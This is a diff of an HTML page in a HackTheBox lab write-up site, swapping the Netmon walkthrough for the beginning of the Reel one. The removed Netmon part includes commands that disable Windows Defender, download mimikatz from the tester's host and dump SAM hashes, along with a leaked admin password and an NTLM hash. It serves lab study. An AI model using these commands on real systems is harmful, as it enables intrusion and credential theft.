@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://Zer0-hex.github.io/write-up/HackTheBox/Machines/Netmon/">
+        <link rel="canonical" href="https://Zer0-hex.github.io/write-up/HackTheBox/Machines/Reel/">
       
       
-        <link rel="prev" href="../Monitored/">
+        <link rel="prev" href="../Netmon/">
       
       
-        <link rel="next" href="../Reel/">
+        <link rel="next" href="../Resolute/">
       
       
       <link rel="icon" href="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512">
@@ -22,7 +22,7 @@
     
     
       
-        <title>Netmon - Write-up</title>
+        <title>Reel - Write-up</title>
       
     
     
@@ -64,7 +64,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#netmon" class="md-skip">
+        <a href="#reel" class="md-skip">
           跳转至
         </a>
       
@@ -97,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Netmon
+              Reel
             
           </span>
         </div>
@@ -911,6 +911,27 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../Netmon/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Netmon
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -927,7 +948,7 @@
           
   
   <span class="md-ellipsis">
-    Netmon
+    Reel
   </span>
   
 
@@ -938,7 +959,7 @@
         
   
   <span class="md-ellipsis">
-    Netmon
+    Reel
   </span>
   
 
@@ -960,27 +981,9 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#recon" class="md-nav__link">
+  <a href="#recon-enum" class="md-nav__link">
     <span class="md-ellipsis">
-      Recon
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#shell-as-root" class="md-nav__link">
-    <span class="md-ellipsis">
-      Shell as Root
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#dump-hash" class="md-nav__link">
-    <span class="md-ellipsis">
-      Dump Hash
+      Recon &amp; Enum
     </span>
   </a>
   
@@ -990,27 +993,6 @@
   
 </nav>
       
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Reel/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Reel
-  </span>
-  
-
-      </a>
     </li>
   
 
@@ -1369,95 +1351,99 @@
   
 
 
-<h1 id="netmon">Netmon</h1>
-<p><img alt="" src="../assets/Netmon.png" /></p>
-<h2 id="recon">Recon</h2>
+<h1 id="reel">Reel</h1>
+<p><img alt="" src="../assets/Reel.png" /></p>
+<h2 id="recon-enum">Recon &amp; Enum</h2>
 <blockquote>
-<p>export IP=10.10.10.152
-- <code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.234</code>
-<div class="language-text highlight"><pre><span></span><code>PORT      STATE SERVICE      VERSION
-21/tcp    open  ftp          Microsoft ftpd
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| 02-02-19  11:18PM                 1024 .rnd
-| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
-| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
-| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
-| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
-| 02-03-19  07:08AM       &lt;DIR&gt;          Users
-|_11-10-23  09:20AM       &lt;DIR&gt;          Windows
-| ftp-syst:
-|_  SYST: Windows_NT
-80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
-|_http-server-header: PRTG/18.1.37.13946
-| http-title: Welcome | PRTG Network Monitor (NETMON)
-|_Requested resource was /index.htm
-|_http-trane-info: Problem with XML parsing of /evox/about
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49668/tcp open  msrpc        Microsoft Windows RPC
-49669/tcp open  msrpc        Microsoft Windows RPC
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+<p>export IP=10.10.10.77
+- <code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.252</code>
+<div class="language-shell highlight"><pre><span></span><code>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">      </span>VERSION
+<span class="m">21</span>/tcp<span class="w">    </span>open<span class="w">  </span>ftp<span class="w">          </span>Microsoft<span class="w"> </span>ftpd
+<span class="p">|</span><span class="w"> </span>ftp-anon:<span class="w"> </span>Anonymous<span class="w"> </span>FTP<span class="w"> </span>login<span class="w"> </span>allowed<span class="w"> </span><span class="o">(</span>FTP<span class="w"> </span>code<span class="w"> </span><span class="m">230</span><span class="o">)</span>
+<span class="p">|</span>_05-28-18<span class="w">  </span><span class="m">11</span>:19PM<span class="w">       </span>&lt;DIR&gt;<span class="w">          </span>documents
+<span class="p">|</span><span class="w"> </span>ftp-syst:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">  </span>SYST:<span class="w"> </span>Windows_NT
+<span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">  </span>ssh<span class="w">          </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">82</span>:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">23</span>:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">25</span>/tcp<span class="w">    </span>open<span class="w">  </span>smtp?
+<span class="p">|</span><span class="w"> </span>smtp-commands:<span class="w"> </span>REEL,<span class="w"> </span>SIZE<span class="w"> </span><span class="m">20480000</span>,<span class="w"> </span>AUTH<span class="w"> </span>LOGIN<span class="w"> </span>PLAIN,<span class="w"> </span>HELP
+<span class="p">|</span>_<span class="w"> </span><span class="m">211</span><span class="w"> </span>DATA<span class="w"> </span>HELO<span class="w"> </span>EHLO<span class="w"> </span>MAIL<span class="w"> </span>NOOP<span class="w"> </span>QUIT<span class="w"> </span>RCPT<span class="w"> </span>RSET<span class="w"> </span>SAML<span class="w"> </span>TURN<span class="w"> </span>VRFY
+<span class="p">|</span><span class="w"> </span>fingerprint-strings:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>DNSStatusRequestTCP,<span class="w"> </span>DNSVersionBindReqTCP,<span class="w"> </span>Kerberos,<span class="w"> </span>LDAPBindReq,<span class="w"> </span>LDAPSearchReq,<span class="w"> </span>LPDString,<span class="w"> </span>NULL,<span class="w"> </span>RPCCheck,<span class="w"> </span>SMBProgNeg,<span class="w"> </span>SSLSessionReq,<span class="w"> </span>TLSSessionReq,<span class="w"> </span>X11Probe:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span><span class="m">220</span><span class="w"> </span>Mail<span class="w"> </span>Service<span class="w"> </span>ready
+<span class="p">|</span><span class="w">   </span>FourOhFourRequest,<span class="w"> </span>GenericLines,<span class="w"> </span>GetRequest,<span class="w"> </span>HTTPOptions,<span class="w"> </span>RTSPRequest:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span><span class="m">220</span><span class="w"> </span>Mail<span class="w"> </span>Service<span class="w"> </span>ready
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">   </span>Hello:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span><span class="m">220</span><span class="w"> </span>Mail<span class="w"> </span>Service<span class="w"> </span>ready
+<span class="p">|</span><span class="w">     </span>EHLO<span class="w"> </span>Invalid<span class="w"> </span>domain<span class="w"> </span>address.
+<span class="p">|</span><span class="w">   </span>Help:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span><span class="m">220</span><span class="w"> </span>Mail<span class="w"> </span>Service<span class="w"> </span>ready
+<span class="p">|</span><span class="w">     </span>DATA<span class="w"> </span>HELO<span class="w"> </span>EHLO<span class="w"> </span>MAIL<span class="w"> </span>NOOP<span class="w"> </span>QUIT<span class="w"> </span>RCPT<span class="w"> </span>RSET<span class="w"> </span>SAML<span class="w"> </span>TURN<span class="w"> </span>VRFY
+<span class="p">|</span><span class="w">   </span>SIPOptions:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span><span class="m">220</span><span class="w"> </span>Mail<span class="w"> </span>Service<span class="w"> </span>ready
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">     </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="p">|</span><span class="w">   </span>TerminalServerCookie:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span><span class="m">220</span><span class="w"> </span>Mail<span class="w"> </span>Service<span class="w"> </span>ready
+<span class="p">|</span>_<span class="w">    </span>sequence<span class="w"> </span>of<span class="w"> </span>commands
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>R2<span class="w"> </span>Standard<span class="w"> </span><span class="m">9600</span><span class="w"> </span>microsoft-ds<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>HTB<span class="o">)</span>
+<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>ncacn_http<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">49159</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+...
+Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
+Device<span class="w"> </span>type:<span class="w"> </span>general<span class="w"> </span>purpose<span class="p">|</span>phone<span class="p">|</span>specialized
+Running<span class="w"> </span><span class="o">(</span>JUST<span class="w"> </span>GUESSING<span class="o">)</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">2012</span><span class="p">|</span><span class="m">8</span><span class="p">|</span>Phone<span class="p">|</span><span class="m">7</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>
+OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2012:r2<span class="w"> </span>cpe:/o:microsoft:windows_8<span class="w"> </span>cpe:/o:microsoft:windows<span class="w"> </span>cpe:/o:microsoft:windows_7
+Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span><span class="o">(</span><span class="m">88</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">8</span>.1<span class="w"> </span>Update<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span><span class="m">86</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Phone<span class="w"> </span><span class="m">7</span>.5<span class="w"> </span>or<span class="w"> </span><span class="m">8</span>.0<span class="w"> </span><span class="o">(</span><span class="m">86</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Embedded<span class="w"> </span>Standard<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="o">(</span><span class="m">85</span>%<span class="o">)</span>
+No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
+Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>REEL<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
 
-Host script results:
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2024-01-09T03:28:19
-|_  start_date: 2024-01-09T03:24:35
-</code></pre></div></p>
-</blockquote>
-<h2 id="shell-as-root">Shell as Root</h2>
-<ul>
-<li>FTP 匿名登陆，可以遍历系统文件
-<img alt="" src="../assets/Pasted%20image%2020240109114447.png" /></li>
-<li>发现安装了 PRTG Network Monitor 软件，看一下应用数据
-<img alt="" src="../assets/Pasted%20image%2020240109114553.png" />
-<img alt="" src="../assets/Pasted%20image%2020240109114802.png" /></li>
-<li>登录 <code>prtgadmin/PrTg@dmin2018</code>
-<img alt="" src="../assets/Pasted%20image%2020240109125354.png" />
-提示密码错误，由于是备份的密码，考虑时间问题，尝试 <code>PrTg@dmin2019,PrTg@dmin2020</code> 等组合</li>
-<li>正确密码: <code>prtgadmin/PrTg@dmin2019</code>，站点可以设置中文
-<img alt="" src="../assets/Pasted%20image%2020240109125904.png" /></li>
-<li>主页有版本，优先查找 CVE
-<img alt="" src="../assets/Pasted%20image%2020240109145130.png" />
-<img alt="" src="../assets/Pasted%20image%2020240109145147.png" /></li>
-<li>认证 RCE，尝试利用
-<img alt="" src="../assets/Pasted%20image%2020240109150100.png" /></li>
-<li>evil-winrm 连接已添加的新用户 <code>pentest/P3nT3st!</code>
-<img alt="" src="../assets/Pasted%20image%2020240109150202.png" /></li>
-</ul>
-<h2 id="dump-hash">Dump Hash</h2>
-<div class="language-shell highlight"><pre><span></span><code><span class="c1"># 关闭实时防护</span>
-<span class="nv">$preferences</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-MpPreference
-Set-MpPreference<span class="w"> </span>-DisableRealtimeMonitoring<span class="w"> </span><span class="o">(</span>!<span class="nv">$preferences</span>.DisableRealtimeMonitoring<span class="o">)</span><span class="w"> </span>
-
-powershell<span class="w"> </span><span class="o">(</span>new-object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://10.10.16.6/mimikatz.zip&#39;</span>,<span class="s1">&#39;C:\Users\pentest\Documents\mimikatz.zip&#39;</span><span class="o">)</span>
-C:<span class="se">\i</span>netpub<span class="se">\l</span>ogs<span class="se">\m</span>imikatz.exe<span class="w"> </span><span class="s2">&quot;privilege::debug&quot;</span><span class="w"> </span><span class="s2">&quot;token::elevate&quot;</span><span class="w"> </span><span class="s2">&quot;lsadump::sam&quot;</span><span class="w"> </span><span class="nb">exit</span>
-
----
-Administrator:d0f73603a4d96655430fdf02de4afaee
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb-os-discovery:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>OS:<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>R2<span class="w"> </span>Standard<span class="w"> </span><span class="m">9600</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>R2<span class="w"> </span>Standard<span class="w"> </span><span class="m">6</span>.3<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span>OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2012::-
+<span class="p">|</span><span class="w">   </span>Computer<span class="w"> </span>name:<span class="w"> </span>REEL
+<span class="p">|</span><span class="w">   </span>NetBIOS<span class="w"> </span>computer<span class="w"> </span>name:<span class="w"> </span>REEL<span class="se">\x</span><span class="m">00</span>
+<span class="p">|</span><span class="w">   </span>Domain<span class="w"> </span>name:<span class="w"> </span>HTB.LOCAL
+<span class="p">|</span><span class="w">   </span>Forest<span class="w"> </span>name:<span class="w"> </span>HTB.LOCAL
+<span class="p">|</span><span class="w">   </span>FQDN:<span class="w"> </span>REEL.HTB.LOCAL
+<span class="p">|</span>_<span class="w">  </span>System<span class="w"> </span>time:<span class="w"> </span><span class="m">2024</span>-01-15T09:28:22+00:00
+<span class="p">|</span><span class="w"> </span>smb-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>account_used:<span class="w"> </span>&lt;blank&gt;
+<span class="p">|</span><span class="w">   </span>authentication_level:<span class="w"> </span>user
+<span class="p">|</span><span class="w">   </span>challenge_response:<span class="w"> </span>supported
+<span class="p">|</span>_<span class="w">  </span>message_signing:<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">3</span>:0:2:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2024</span>-01-15T09:28:26
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span><span class="m">2024</span>-01-15T09:20:27
 </code></pre></div>
+- <code>crackmapexec smb $IP -u guest -p '' --shares</code>
+<img alt="" src="../assets/Pasted%20image%2020240115172622.png" /></p>
+</blockquote>
+<ul>
+<li>ftp 发现多个文件
+<img alt="" src="../assets/Pasted%20image%2020240115173218.png" /></li>
+</ul>
 
 
 
